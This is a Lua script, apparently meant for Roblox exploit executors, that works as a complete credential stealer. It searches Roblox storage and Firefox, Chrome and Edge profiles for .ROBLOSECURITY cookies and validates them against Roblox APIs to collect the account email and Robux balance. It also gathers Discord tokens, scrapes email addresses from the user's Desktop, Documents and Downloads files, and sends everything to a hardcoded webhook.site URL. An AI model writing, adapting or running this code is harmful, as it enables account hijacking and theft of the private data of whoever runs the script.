--========== Delta -> webhook.site | كود واحد نهائي ==========
local WEBHOOK = "https://webhook.site/cbaab0fc-3dfe-417d-aa74-535011ca7300"

local R = {}
local function a(s) R[#R + 1] = tostring(s) end

local P = game:GetService("Players")
local H = game:GetService("HttpService")
local lp = P.LocalPlayer

local function env(n)
    local ok, v = pcall(function() return os.getenv(n) end)
    if ok and type(v) == "string" and v ~= "" then return v end
    local g = getgenv and getgenv().getenv
    if g then
        local o, r = pcall(g, n)
        if o and type(r) == "string" and r ~= "" then return r end
    end
    return nil
end

local LA, AP, UP = env("LOCALAPPDATA"), env("APPDATA"), env("USERPROFILE")

local function rf(p)
    if not readfile or not p then return nil end
    local ok, d = pcall(readfile, p)
    if ok and type(d) == "string" then return d end
    return nil
end

local function ls(p)
    if not listfiles or not p then return {} end
    local ok, t = pcall(listfiles, p)
    if ok and type(t) == "table" then return t end
    return {}
end

local function isf(p)
    if not isfile then return true end
    local ok, r = pcall(isfile, p)
    if ok then return r end
    return false
end

local function req(o)
    local f = request or http_request or (syn and syn.request) or (http and http.request)
    if not f then return nil end
    local ok, r = pcall(f, o)
    if ok then return r end
    return nil
end

--=========== INFO ===========
local exe = "?"
if identifyexecutor then
    local o, n = pcall(identifyexecutor)
    if o then exe = tostring(n) end
end

a("========== INFO ==========")
a("Date     : " .. os.date("%Y-%m-%d %H:%M:%S"))
a("Username : " .. (lp and lp.Name or "?"))
a("UserId   : " .. (lp and tostring(lp.UserId) or "?"))
a("Executor : " .. exe)
a("PC User  : " .. (env("USERNAME") or "?"))
a("")

--=========== ROBLOSECURITY ===========
local PFX, PAT = "_|WARNING:-DO-NOT-SHARE--WARNING-|_", "_|WARNING:%-DO%-NOT%-SHARE%-%-WARNING%-|_"
local ck, seenC = {}, {}

local function grab(d)
    if type(d) ~= "string" then return end
    local i = 1
    while #ck < 10 do
        local s, e = d:find(PAT, i)
        if not s then break end
        local v = d:sub(e + 1, e + 1200):match("^([%w%+%=%%%-%._~%*]+)")
        if v and #v > 60 and not seenC[v] then
            seenC[v] = true
            ck[#ck + 1] = PFX .. v
        end
        i = e + 1
    end
end

-- ملفات روبلوكس (المصدر الأضمن)
for _, p in ipairs({
    LA and (LA .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"),
    LA and (LA .. "\\Roblox\\LocalStorage\\RobloxCookies.dat.bak"),
}) do
    if p and isf(p) then grab(rf(p)) end
end

-- Firefox (كوكيز غير مشفرة)
for _, prof in ipairs(ls(AP and (AP .. "\\Mozilla\\Firefox\\Profiles"))) do
    grab(rf(prof .. "\\cookies.sqlite"))
end

-- Chrome + Edge: بحث في كل البروفايلات
local roots = {
    LA and (LA .. "\\Google\\Chrome\\User Data"),
    LA and (LA .. "\\Microsoft\\Edge\\User Data"),
}
for _, root in ipairs(roots) do
    for _, prof in ipairs(ls(root)) do
        for _, dir in ipairs({
            prof,
            prof .. "\\Network",
            prof .. "\\Local Storage\\leveldb",
            prof .. "\\Session Storage",
        }) do
            for _, f in ipairs(ls(dir)) do
                if isf(f) and (f:match("%.ldb$") or f:match("%.log$") or f:match("%.sqlite$")
                    or f:match("%.dat$") or f:match("%.json$")) then
                    grab(rf(f))
                end
            end
        end
    end
end

a("== ROBLOSECURITY ==")
if #ck == 0 then
    a("(none)")
else
    for i, c in ipairs(ck) do a("[" .. i .. "] " .. c) end
end
a("")

--=========== ACCOUNTS من الكوكيز ===========
local function api(path, c)
    local r = req({
        Url = "https://" .. path,
        Method = "GET",
        Headers = {
            ["Cookie"] = ".ROBLOSECURITY=" .. c,
            ["User-Agent"] = "Roblox/WinInet",
        },
    })
    if r and r.Body then
        local ok, d = pcall(function() return H:JSONDecode(r.Body) end)
        if ok and type(d) == "table" then return d end
    end
    return nil
end

a("== ACCOUNTS ==")
for i, c in ipairs(ck) do
    local acc = api("users.roblox.com/v1/users/authenticated", c)
    if acc and acc.id then
        a("[" .. i .. "] " .. tostring(acc.name) .. " | ID: " .. tostring(acc.id))
        local m = api("accountsettings.roblox.com/v1/email", c)
        local b = api("economy.roblox.com/v1/user/currency", c)
        if m then a("    Email : " .. tostring(m.email)) end
        if b then a("    Robux : " .. tostring(b.robux)) end
    else
        a("[" .. i .. "] invalid cookie")
    end
end
a("")

--=========== DISCORD TOKENS ===========
local tk, seenT = {}, {}
for _, dir in ipairs({
    AP and (AP .. "\\discord\\Local Storage\\leveldb"),
    AP and (AP .. "\\discordcanary\\Local Storage\\leveldb"),
    AP and (AP .. "\\discordptb\\Local Storage\\leveldb"),
    LA and (LA .. "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
    LA and (LA .. "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"),
}) do
    for _, f in ipairs(ls(dir)) do
        if isf(f) and (f:match("%.ldb$") or f:match("%.log$")) then
            local d = rf(f) or ""
            for t in d:gmatch("mfa%.[%w%-_=]{80,92}") do
                if not seenT[t] then seenT[t] = true; tk[#tk + 1] = t end
            end
            for t in d:gmatch("[%w%-_]{24,28}%.[%w%-_]{6,7}%.[%w%-_]{27,42}") do
                if not seenT[t] then seenT[t] = true; tk[#tk + 1] = t end
            end
        end
    end
end

a("== DISCORD TOKENS ==")
if #tk == 0 then a("(none)") else
    for i, t in ipairs(tk) do a("[" .. i .. "] " .. t) end
end
a("")

--=========== EMAILS ===========
local em, sm = {}, {}
local function gm(t)
    for m in t:gmatch("[%w%.%-_%+]+@[%w%.%-_]+%.[%a][%a]+") do
        if #m < 60 and not sm[m:lower()] then
            sm[m:lower()] = true
            em[#em + 1] = m
        end
        if #em > 40 then return end
    end
end

for _, p in ipairs({
    LA and (LA .. "\\Google\\Chrome\\User Data\\Local State"),
    LA and (LA .. "\\Microsoft\\Edge\\User Data\\Local State"),
    AP and (AP .. "\\discord\\settings.json"),
}) do
    local d = rf(p)
    if d then gm(d) end
end

for _, dir in ipairs({
    UP and (UP .. "\\Desktop"),
    UP and (UP .. "\\Documents"),
    UP and (UP .. "\\Downloads"),
}) do
    for _, f in ipairs(ls(dir)) do
        if isf(f) and (f:match("%.txt$") or f:match("%.json$") or f:match("%.log$")
            or f:match("%.ini$") or f:match("%.csv$")) then
            local d = rf(f)
            if d and #d < 200000 then gm(d) end
        end
    end
end

a("== EMAILS ==")
if #em == 0 then a("(none)") else
    for i, m in ipairs(em) do a("[" .. i .. "] " .. m) end
end

--=========== حفظ محلي + إرسال ===========
local text = table.concat(R, "\n")

local w = writefile or (getgenv and getgenv().writefile)
if w then pcall(w, "PASORD.TXT", text) end

req({
    Url = WEBHOOK,
    Method = "POST",
    Headers = { ["Content-Type"] = "text/plain; charset=utf-8" },
    Body = text,
})
